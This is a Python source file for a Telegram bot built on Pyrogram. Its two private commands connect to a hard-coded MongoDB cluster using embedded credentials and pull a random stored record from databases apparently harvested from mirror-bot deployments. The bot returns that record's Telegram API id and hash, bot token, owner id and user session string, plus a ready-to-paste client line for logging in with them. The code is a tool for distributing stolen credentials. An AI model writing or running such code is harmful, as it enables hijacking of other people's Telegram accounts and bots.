import random
import pymongo
from Arctix import Arctix as app
from pyrogram import Client, filters

@app.on_message(filters.command("vmongodata") & filters.private)
async def fetch_random_mongodb_data(client, message):
    try:
        selected_db = random.choice(['mltb', 'wzmlx', 'zmirror'])
        
        url = "mongodb+srv://mongo:mongo@mongo.1ics4jt.mongodb.net/?retryWrites=true&w=majority"
        mongo_client = pymongo.MongoClient(url)
        mongo_db = mongo_client[selected_db]
        mongo_collection = mongo_db['data']

        # Attempt to fetch random document from MongoDB
        random_document = mongo_collection.aggregate([
            {'$match': {'bot_username': {'$exists': True, '$ne': None, '$ne': "None"}}},
            {'$sample': {'size': 1}}
        ]).next()
        
        # Print selected database
        print(selected_db)
             
        formatted_text = (
            f"Source: https://github.com/{random_document['repo_link']}\n"
            f"API id: `{random_document['telegram_api']}`\n"
            f"API hash: `{random_document['telegram_hash']}`\n"
            f"OWNER id: `{random_document['owner_id']}`\n"
            f"Bot Token: `{random_document['bot_token']}`\n"
            f"Bot Username: `@{random_document['bot_username']}`\n"
            f"String: `{random_document['user_session_string']}`\n\n"
            f"App: `app = Client(\"my_account\", bot_token=\"{random_document['bot_token']}\", api_id=\"{random_document['telegram_api']}\", api_hash=\"{random_document['telegram_hash']}\")`"
        )

        await message.reply_text(text=formatted_text)
        
    except pymongo.errors.PyMongoError as e:
        print(f"PyMongoError: {e}")
        await message.reply_text("An error occurred while fetching data from the database. Please try again later.")
    except StopIteration:
        await message.reply_text("No matching documents found in the database.")
    except Exception as e:
        print(f"Error fetching random MongoDB data: {e}")
        await message.reply_text("An error occurred while processing your request. Please try again later.")

@app.on_message(filters.command("mongodata") & filters.private)
async def fetch_random_mongodb_data_another(client, message):
    try:
        selected_db = random.choice(['mltb', 'wzmlx', 'zmirror'])
        
        url = "mongodb+srv://mongo:mongo@mongo.1ics4jt.mongodb.net/?retryWrites=true&w=majority"
        mongo_client = pymongo.MongoClient(url)
        mongo_db = mongo_client[selected_db]
        mongo_collection = mongo_db['data']

        # Attempt to fetch random document from MongoDB
        random_document = mongo_collection.aggregate([
            {'$match': {'bot_username': {'$exists': True, '$ne': None, '$ne': "None"},
            'user_session_string': {'$exists': True, '$ne': None, '$nin': ["", "None"]}}},
            {'$sample': {'size': 1}}
        ]).next()
        
        # Print selected database
        print(selected_db)
             
        formatted_text = (
            f"Source: https://github.com/{random_document['repo_link']}\n"
            f"API id: `{random_document['telegram_api']}`\n"
            f"API hash: `{random_document['telegram_hash']}`\n"
            f"OWNER id: `{random_document['owner_id']}`\n"
            f"Bot Token: `{random_document['bot_token']}`\n"
            f"Bot Username: `@{random_document['bot_username']}`\n"
            f"String: `{random_document['user_session_string']}`\n\n"
            f"App: `app = Client(\"my_account\", bot_token=\"{random_document['bot_token']}\", api_id=\"{random_document['telegram_api']}\", api_hash=\"{random_document['telegram_hash']}\")`"
        )

        await message.reply_text(text=formatted_text)
        
    except pymongo.errors.PyMongoError as e:
        print(f"PyMongoError: {e}")
        await message.reply_text("An error occurred while fetching data from the database. Please try again later.")
    except StopIteration:
        await message.reply_text("No matching documents found in the database.")
    except Exception as e:
        print(f"Error fetching random MongoDB data: {e}")
        await message.reply_text("An error occurred while processing your request. Please try again later.")
